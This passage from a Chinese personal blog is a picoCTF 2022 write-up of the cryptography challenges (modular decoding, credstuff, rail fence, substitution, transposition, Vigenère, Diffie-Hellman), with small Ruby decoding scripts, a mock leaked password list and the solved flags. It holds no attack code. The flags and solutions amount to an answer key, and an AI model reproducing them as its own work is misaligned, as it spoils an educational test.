alphabet (uppercase), 26-35 are the decimal
digits, and 36 is an underscore.</p>
</blockquote>

<p>其实题目的做法说的非常显然了, 所以我就不解释了.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">map</span> <span class="o">=</span> <span class="p">(</span><span class="s2">"A"</span><span class="o">..</span><span class="s2">"Z"</span><span class="p">).</span><span class="nf">to_a</span> <span class="o">+</span> <span class="p">(</span><span class="s2">"0"</span><span class="o">..</span><span class="s2">"9"</span><span class="p">).</span><span class="nf">to_a</span> <span class="o">+</span> <span class="p">[</span><span class="s2">"_"</span><span class="p">]</span>
<span class="n">enc</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"message.txt"</span><span class="p">).</span><span class="nf">read</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="s2">" "</span><span class="p">)</span>
<span class="n">enc</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">s</span><span class="o">|</span>
  <span class="nb">print</span> <span class="n">map</span><span class="p">[</span><span class="n">s</span><span class="p">.</span><span class="nf">to_i</span> <span class="o">%</span> <span class="mi">37</span><span class="p">]</span>
<span class="k">end</span>

<span class="c1"># =&gt; R0UND_N_R0UND_ADD17EC2</span>
</code></pre></div></div>

<p>mod2的时候, 有点丢脸, 因为我看不懂modular inverse… 
当时以为是负数, 愣是尬了好久, 直到我看了看hint, 
inverse是乘法的逆元…</p>

<p>(我检讨, 我线性代数白学了, 在Z模base里面的逆元都不会求了, 
还要看hint才能想到. 太惨了)</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">map</span> <span class="o">=</span> <span class="p">(</span><span class="s2">"A"</span><span class="o">..</span><span class="s2">"Z"</span><span class="p">).</span><span class="nf">to_a</span> <span class="o">+</span> <span class="p">(</span><span class="s2">"0"</span><span class="o">..</span><span class="s2">"9"</span><span class="p">).</span><span class="nf">to_a</span> <span class="o">+</span> <span class="p">[</span><span class="s2">"_"</span><span class="p">]</span>
<span class="n">enc</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"message.txt"</span><span class="p">).</span><span class="nf">read</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="s2">" "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">inverse</span><span class="p">(</span><span class="n">number</span><span class="p">,</span> <span class="n">base</span> <span class="o">=</span> <span class="mi">41</span><span class="p">)</span>
  <span class="n">base</span><span class="p">.</span><span class="nf">times</span> <span class="k">do</span> <span class="o">|</span><span class="n">i</span><span class="o">|</span>
    <span class="k">return</span> <span class="n">i</span> <span class="k">if</span> <span class="n">number</span> <span class="o">*</span> <span class="n">i</span> <span class="o">%</span> <span class="n">base</span> <span class="o">==</span> <span class="mi">1</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="n">enc</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">s</span><span class="o">|</span>
  <span class="nb">print</span> <span class="n">map</span><span class="p">[</span><span class="n">inverse</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">to_i</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span>
<span class="k">end</span>

<span class="c1"># =&gt; 1NV3R53LY_H4RD_8A05D939</span>
</code></pre></div></div>

<blockquote>
  <p>Take each number mod 41 and find the modular 
inverse for the result. Then map to the 
following character set: 1-26 are the alphabet, 
27-36 are the decimal digits, and 37 is an underscore.</p>
</blockquote>

<h3 id="credstuff">credstuff</h3>
<blockquote>
  <p>We found a leak of a blackmarket website’s login 
credentials. Can you find the password of the user 
cultiris and successfully decrypt it?</p>

  <p>Download the leak here.
The first user in <code class="language-plaintext highlighter-rouge">usernames.txt</code> corresponds to the 
first password in <code class="language-plaintext highlighter-rouge">passwords.txt</code>. The second user 
corresponds to the second password, and so on.</p>
</blockquote>

<p>将压缩包解压后:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nb">cat </span>leak/passwords.txt
CMPTmLrgfYCexGzJu6TbdGwZa
GK73YKE2XD2TEnvJeHRBdfpt2
UukmEk5NCPGUSfs5tGWPK26gG
kaL36YJtvZMdbTdLuQRx84t85
...
<span class="o">&gt;</span> <span class="nb">cat </span>leak/usernames.txt
engineerrissoles
icebunt
fruitfultry
celebritypentathlon
...
</code></pre></div></div>

<p>太怪了. 完全没有什么想法. 难道我要从用户的密码里面匹配密码模式和规律吗? 
还是什么的…</p>

<p>好吧, 我的想法太怪了, 原来真实的想法是要找到对应用户的对应密码…
这个就像是网站的数据库泄漏了, 用户的密码和名字都流出来了.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwd</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"leak/passwords.txt"</span><span class="p">).</span><span class="nf">read</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
<span class="n">usr</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"leak/usernames.txt"</span><span class="p">).</span><span class="nf">read</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">)</span>

<span class="n">index</span> <span class="o">=</span> <span class="n">usr</span><span class="p">.</span><span class="nf">index</span> <span class="s2">"cultiris"</span>
<span class="n">pwd</span><span class="p">[</span><span class="n">index</span><span class="p">]</span>
<span class="c1"># =&gt; "cvpbPGS{P7e1S_54I35_71Z3}"</span>
</code></pre></div></div>

<p>这里有两个坑爹的东西:</p>
<ul>
  <li>一个是usr的那个, 换行符比较坑爹</li>
  <li>还有一个是, pwd[377]还是一个加密的, 不过好在这个加密形式比较眼熟
猜测为rot13, 然后一发入魂.</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">picoCTF{C7r1F_54V35_71M3}</code></p>

<h3 id="morse-code">morse code</h3>
<p>做题前: 就这? 不过摩斯电码嘛, 简单. 拿到题之后, 我人傻了, 
为什么这个速度这么快? 为什么这么难听懂… 呜呜呜</p>

<p>(听是不可能听出来的, 听不出来, 所以用<a href="https://mp3cut.net">波形查看</a>, 
然后Morse Code<a href="https://morsecode.world/international/translator.html">解码</a>, 
不过是在没有想到的是, 题目还有小写字符和停顿的下划线要求, 
尝试了好多遍才成功. 唉)</p>

<h3 id="rail-fence">rail fence</h3>
<p>栅栏编码加密…</p>

<blockquote>
  <p>A type of transposition cipher is the rail fence cipher, 
which is described <a href="https://en.wikipedia.org/wiki/Rail_fence_cipher">here</a>. 
Here is one such cipher encrypted using the rail fence 
with 4 rails. Can you decrypt it?</p>
</blockquote>

<p>直接使用<a href="https://gchq.github.io/CyberChef">cyberchef</a>, 
得到结果: <code class="language-plaintext highlighter-rouge">The flag is: WH3R3_D035_7H3_F3NC3_8361N_4ND_3ND_D00AFDD3</code>, 
解决.</p>

<h3 id="substitution-0--1--2">substitution 0 &amp; 1 &amp; 2</h3>
<p>就是替换字符, 只不过难度不一样, 0的那个是直接在顶部提供了替换规则, 
然后1的那个可以利用标点符号来配合猜词, 然后2删掉了标点, 所以就麻烦了.</p>

<p>为了匹配1和2, 我做了一个比较无聊的小程序来替换:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 导入彩色打印输出的库</span>
<span class="nb">require</span> <span class="s2">"colorize"</span>

<span class="c1"># 对单词的出现次数进行一个分析</span>
<span class="k">def</span> <span class="nf">anlysis</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
  <span class="nb">hash</span> <span class="o">=</span> <span class="no">Hash</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
  <span class="n">enc</span><span class="p">.</span><span class="nf">each_char</span> <span class="k">do</span> <span class="o">|</span><span class="n">c</span><span class="o">|</span>
    <span class="nb">hash</span><span class="p">[</span><span class="n">c</span><span class="p">.</span><span class="nf">downcase</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
  <span class="k">end</span>
  <span class="p">(</span><span class="s2">"a"</span><span class="o">..</span><span class="s2">"z"</span><span class="p">).</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">c</span><span class="o">|</span>
    <span class="k">if</span> <span class="nb">hash</span><span class="p">[</span><span class="n">c</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span>
      <span class="nb">print</span> <span class="n">c</span><span class="p">,</span> <span class="s2">", "</span><span class="p">,</span> <span class="nb">hash</span><span class="p">[</span><span class="n">c</span><span class="p">],</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
    <span class="k">end</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="c1"># 输出修改过的字符串</span>
<span class="k">def</span> <span class="nf">test</span><span class="p">(</span><span class="n">enc</span><span class="p">,</span> <span class="n">alphabet</span><span class="p">,</span> <span class="n">substitution</span><span class="p">)</span>
  <span class="n">enc</span><span class="p">.</span><span class="nf">each_char</span> <span class="k">do</span> <span class="o">|</span><span class="n">c</span><span class="o">|</span>
    <span class="k">if</span> <span class="n">i</span> <span class="o">=</span> <span class="n">substitution</span><span class="p">.</span><span class="nf">index</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
      <span class="nb">print</span> <span class="n">alphabet</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="nf">colorize</span><span class="p">(</span><span class="ss">:green</span><span class="p">)</span>
    <span class="k">else</span>
      <span class="nb">print</span> <span class="n">c</span>
    <span class="k">end</span>
  <span class="k">end</span>
  <span class="nb">print</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
<span class="k">end</span>

<span class="c1"># 撤销前一步的操作</span>
<span class="k">def</span> <span class="nf">undo</span><span class="p">(</span><span class="n">alphabet</span><span class="p">,</span> <span class="n">substitution</span><span class="p">)</span>
  <span class="mi">2</span><span class="p">.</span><span class="nf">times</span> <span class="k">do</span>
    <span class="n">alphabet</span><span class="p">.</span><span class="nf">pop</span>
    <span class="n">substitution</span><span class="p">.</span><span class="nf">pop</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="c1"># 列出已有的替换规则</span>
<span class="k">def</span> <span class="nf">list</span><span class="p">(</span><span class="n">alphabet</span><span class="p">,</span> <span class="n">substitution</span><span class="p">)</span>
  <span class="n">i</span> <span class="o">=</span> <span class="n">alphabet</span><span class="p">.</span><span class="nf">length</span> <span class="o">-</span> <span class="mi">1</span>
  <span class="k">while</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">0</span>
    <span class="nb">print</span> <span class="n">alphabet</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s2">" &lt;-&gt; "</span><span class="p">,</span> <span class="n">substitution</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
    <span class="n">i</span> <span class="o">-=</span> <span class="mi">2</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="c1"># 列出剩下的需要替换的字母</span>
<span class="k">def</span> <span class="nf">remain</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)</span>
  <span class="p">(</span><span class="s2">"A"</span><span class="o">..</span><span class="s2">"Z"</span><span class="p">).</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">c</span><span class="o">|</span>
    <span class="k">unless</span> <span class="n">alphabet</span><span class="p">.</span><span class="nf">include?</span> <span class="n">c</span>
      <span class="nb">print</span> <span class="n">c</span><span class="p">,</span> <span class="s2">", "</span>
    <span class="k">end</span>
  <span class="k">end</span>
  <span class="nb">print</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
<span class="k">end</span>

<span class="c1"># 增加新的替换规则</span>
<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="n">alphabet</span><span class="p">,</span> <span class="n">substitution</span><span class="p">)</span>
  <span class="k">if</span> <span class="n">substitution</span><span class="p">.</span><span class="nf">include?</span> <span class="n">char</span>
    <span class="nb">puts</span> <span class="s2">"already in. "</span>
  <span class="k">else</span>
    <span class="nb">print</span> <span class="s2">"original character: "</span>
    <span class="n">original</span> <span class="o">=</span> <span class="nb">gets</span><span class="p">.</span><span class="nf">strip</span>
    <span class="n">substitution</span> <span class="o">&lt;&lt;</span> <span class="n">char</span><span class="p">.</span><span class="nf">downcase</span>
    <span class="n">alphabet</span> <span class="o">&lt;&lt;</span> <span class="n">original</span><span class="p">.</span><span class="nf">downcase</span>
    <span class="n">substitution</span> <span class="o">&lt;&lt;</span> <span class="n">char</span><span class="p">.</span><span class="nf">upcase</span>
    <span class="n">alphabet</span> <span class="o">&lt;&lt;</span> <span class="n">original</span><span class="p">.</span><span class="nf">upcase</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="c1"># 读取曾经的匹配规则</span>
<span class="k">def</span> <span class="nf">ld</span><span class="p">(</span><span class="n">alphabet</span><span class="p">,</span> <span class="n">substitution</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"save"</span><span class="p">).</span><span class="nf">read</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="s2">" "</span><span class="p">).</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">w</span><span class="o">|</span>
    <span class="n">alphabet</span> <span class="o">&lt;&lt;</span> <span class="n">w</span>
  <span class="k">end</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="s2">" "</span><span class="p">).</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">w</span><span class="o">|</span>
    <span class="n">substitution</span> <span class="o">&lt;&lt;</span> <span class="n">w</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="c1"># 保存</span>
<span class="k">def</span> <span class="nf">save</span><span class="p">(</span><span class="n">alphabet</span><span class="p">,</span> <span class="n">substitution</span><span class="p">)</span>
  <span class="no">File</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s2">"save"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span>
    <span class="n">f</span><span class="p">.</span><span class="nf">write</span> <span class="n">alphabet</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="s2">" "</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> <span class="o">+</span> <span class="n">substitution</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="s2">" "</span><span class="p">)</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="c1"># 字母表</span>
<span class="n">alphabet</span> <span class="o">=</span> <span class="p">[]</span>
<span class="c1"># 对应字母表的替换规则</span>
<span class="n">substitution</span> <span class="o">=</span> <span class="p">[]</span>
<span class="c1"># 读取文件</span>
<span class="n">enc</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"message.txt"</span><span class="p">).</span><span class="nf">read</span>

<span class="c1"># 首先输出</span>
<span class="nb">puts</span> <span class="s2">"The encoded text is :"</span>
<span class="nb">puts</span> <span class="n">enc</span>

<span class="nb">puts</span> <span class="s2">"And give you the anlysis: "</span>
<span class="n">anlysis</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>

<span class="kp">loop</span> <span class="k">do</span>
  <span class="nb">print</span> <span class="s2">"substitution character (or commands): "</span>
  <span class="n">get</span> <span class="o">=</span> <span class="nb">gets</span><span class="p">.</span><span class="nf">strip</span>
  <span class="k">case</span> <span class="n">get</span>
  <span class="k">when</span> <span class="s2">"exit"</span>
    <span class="k">break</span>
  <span class="k">when</span> <span class="s2">"undo"</span>
    <span class="n">undo</span><span class="p">(</span><span class="n">alphabet</span><span class="p">,</span> <span class="n">substitution</span><span class="p">)</span>
  <span class="k">when</span> <span class="s2">"list"</span>
    <span class="n">list</span><span class="p">(</span><span class="n">alphabet</span><span class="p">,</span> <span class="n">substitution</span><span class="p">)</span>
  <span class="k">when</span> <span class="s2">"load"</span>
    <span class="n">alphabet</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">substitution</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">ld</span><span class="p">(</span><span class="n">alphabet</span><span class="p">,</span> <span class="n">substitution</span><span class="p">)</span>
  <span class="k">when</span> <span class="s2">"save"</span>
    <span class="n">save</span><span class="p">(</span><span class="n">alphabet</span><span class="p">,</span> <span class="n">substitution</span><span class="p">)</span>
  <span class="k">when</span> <span class="s2">"remain"</span>
    <span class="n">remain</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)</span>
  <span class="k">else</span>
    <span class="k">if</span> <span class="n">get</span><span class="p">.</span><span class="nf">length</span> <span class="o">&gt;</span> <span class="mi">1</span>
      <span class="nb">puts</span> <span class="s2">"invaild command"</span>
    <span class="k">else</span>
      <span class="n">add</span><span class="p">(</span><span class="n">get</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">alphabet</span><span class="p">,</span> <span class="n">substitution</span><span class="p">)</span>
    <span class="k">end</span>
  <span class="k">end</span>
  <span class="nb">test</span><span class="p">(</span><span class="n">enc</span><span class="p">,</span> <span class="n">alphabet</span><span class="p">,</span> <span class="n">substitution</span><span class="p">)</span>
<span class="k">end</span>
</code></pre></div></div>

<p>然后替换的时候就可以有一个比较好的体验了.</p>

<p>(注: 其实还可以做一个小小的弊, 因为我知道flag的形式是picoCTF的开头的, 
所以我可以有一些简单的小提示了. 甚至也可以利用词频出现的次数来判断. )</p>

<h3 id="transposition-trial">transposition trial</h3>
<blockquote>
  <p>Our data got corrupted on the way here. 
Luckily, nothing got replaced, but every 
block of 3 got scrambled around! The 
first word seems to be three letters long, 
maybe you can use that to recover the rest 
of the message.</p>
</blockquote>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 从左到右旋转</span>
<span class="k">def</span> <span class="nf">rot</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
  <span class="n">str</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">str</span><span class="p">[</span><span class="mi">0</span><span class="o">..-</span><span class="mi">2</span><span class="p">]</span>
<span class="k">end</span>

<span class="n">enc</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"message.txt"</span><span class="p">).</span><span class="nf">read</span>

<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">&lt;</span> <span class="n">enc</span><span class="p">.</span><span class="nf">length</span>
  <span class="nb">print</span> <span class="n">rot</span><span class="p">(</span><span class="n">enc</span><span class="p">[</span><span class="n">i</span><span class="o">..</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">)])</span>
  <span class="n">i</span> <span class="o">+=</span> <span class="mi">3</span>
<span class="k">end</span>

<span class="c1"># =&gt; The flag is picoCTF{7R4N5P051N6_15_3XP3N51V3_A9AFB178}</span>
</code></pre></div></div>

<p>也不是特别难…</p>

<h3 id="vigenere">Vigenere</h3>
<blockquote>
  <p>Decrypt this message using this key “CYLAB”.</p>
</blockquote>

<p>根据名字的提示, 放到cyberchef里面, 一键通关. 
<code class="language-plaintext highlighter-rouge">picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_2951a89h}</code></p>

<p>等我以后再来看看吧.</p>

<p><a href="https://en.wikipedia.org/wiki/Vigenère_cipher">维基百科</a></p>

<h3 id="diffie-hellman">diffie hellman</h3>
<blockquote>
  <p>Alice and Bob wanted to exchange information secretly. 
The two of them agreed to use the Diffie-Hellman key 
exchange algorithm, using p = 13 and g = 5. They both 
chose numbers secretly where Alice chose 7 and Bob 
chose 3. Then, Alice sent Bob some encoded text (with 
both letters and digits) using the generated key as the 
shift amount for a Caesar cipher over the alphabet and 
the decimal digits. Can you figure out the contents 
of the message?</p>

  <p>Hints</p>
  <ul>
    <li>Diffie-Hellman key exchange is a well known algorithm for 
generating keys, try looking up how the secret key is generated</li>
    <li>For your Caesar shift amount, try forwards and backwards.</li>
  </ul>
</blockquote>

<p>关于这个Diffie-Hellman Key Exchange Algorithm</p>

\[A = g^a \mathrm{mod} p\\
  B = g^b \mathrm{mod} p\\
  s_A = B^a \mathrm{mod} p\\
  = g^{a b} \mathrm{mod} p\\
  = A^b \mathrm{mod} p = s_B\]

<p>一般使用非常大的$a, b, g$来保证不被暴力破解.</p>

<p>但是还是有中间人窃听的问题.</p>

<p>其实可以爆破的. 毕竟最终的是凯撒位移进行的加密. 那么不久得了, 
每一个位移都是过去不久好了.</p>

<p>好吧, 我开玩笑的.</p>

<p>C4354R_C1PH3R_15_4_817_0U7D473D_3A2BF44E</p>

<p>(注: 这个的凯撒位移的加密方法好像还有点坑爹:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">caesar</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">alphabet</span> <span class="o">=</span> <span class="s2">"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span><span class="p">)</span>
  <span class="n">text</span><span class="p">.</span><span class="nf">each_char</span> <span class="k">do</span> <span class="o">|</span><span class="n">c</span><span class="o">|</span>
    <span class="k">if</span> <span class="n">i</span> <span class="o">=</span> <span class="n">alphabet</span><span class="p">.</span><span class="nf">index</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
      <span class="n">i</span> <span class="o">+=</span> <span class="n">offset</span>
      <span class="n">i</span> <span class="o">%=</span> <span class="n">alphabet</span><span class="p">.</span><span class="nf">length</span>
      <span class="nb">print</span> <span class="n">alphabet</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="k">else</span>
      <span class="nb">print</span> <span class="n">c</span>
    <span class="k">end</span>
  <span class="k">end</span>
<span class="k">end</span>
</code></pre></div></div>

<h2 id="后记">后记</h2>
<p>可以说, 确实不是特别难. 但是我很菜.</p>

<p>希望我会慢慢变强…</p>

  </div><a class="u-url" href="/ctf/picoctf2022-writeup/" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">My Blog</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">My Blog</li><li><a class="u-email" href="mailto:thebigbigwordl@qq.com">thebigbigwordl@qq.com</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/li-yiyang"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">li-yiyang</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>某不知名的很硬的双非学校的物理系学生的无聊博客</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
